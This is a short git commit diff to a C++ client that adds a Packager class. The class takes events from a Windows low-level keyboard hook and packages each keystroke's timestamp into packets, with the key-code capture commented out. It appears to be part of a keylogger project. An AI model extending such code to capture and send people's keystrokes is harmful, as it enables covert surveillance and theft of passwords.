6c83de5a4825a1110bfd42f56dcb28751c63271f
Joseph Barbisan <joseph.barbisan@outlook.com>
2015-10-24 15:29:28 +0200

    Packager update

--- client/Packager.cpp
+++ client/Packager.cpp
@@ -1,4 +1,3 @@
-
 #include "Packager.h"
 
 
@@ -9,4 +8,12 @@ Packager::Packager()
 
 Packager::~Packager()
 {
+}
+
+void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
+	KBDLLHOOKSTRUCT *info = (KBDLLHOOKSTRUCT *)lParam;
+	_pKeys.push_back(new PaquetKeys());
+	_pKeys.back()->setDate(info->time);
+	//_pKeys.back()->setText(info->vkCode);
+	_pKeys.back()->createPaquet();
 }
--- client/Packager.h
+++ client/Packager.h
@@ -1,8 +1,18 @@
+#include "paquetKeys.hh"
+#include <vector>
+#include <map>
+#include <Windows.h>
+
 #pragma once
 class Packager
 {
+	std::vector<PaquetKeys *> _pKeys;
+	bool shift;
+	bool win;
 public:
 	Packager();
 	virtual ~Packager();
+
+	void addKey(int nCode, WPARAM wParam, LPARAM lParam);
 };
 
